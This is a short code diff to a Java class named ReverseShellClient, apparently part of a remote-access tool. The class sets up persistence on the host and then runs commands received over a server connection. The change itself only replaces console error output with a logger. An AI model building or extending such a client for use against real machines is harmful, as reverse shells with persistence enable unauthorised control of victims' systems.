@@ -1,9 +1,11 @@
 package obs1d1anc1ph3r.reverseshell;
 
 import java.io.IOException;
+import java.util.logging.*;
 
 public class ReverseShellClient {
 
+    private static final Logger logger = Logger.getLogger(ReverseShellClient.class.getName());
     private final ServerConnection serverConnection;
     private final CommandHandler commandHandler;
 
@@ -18,7 +20,7 @@ public class ReverseShellClient {
             Persistence.setup();
             commandHandler.handleCommands();
         } catch (IOException e) {
-            System.err.println("Connection error: " + e.getMessage());
+            logger.log(Level.SEVERE, "Connection error: " + e.getMessage(), e);
         } finally {
             serverConnection.cleanup();
         }
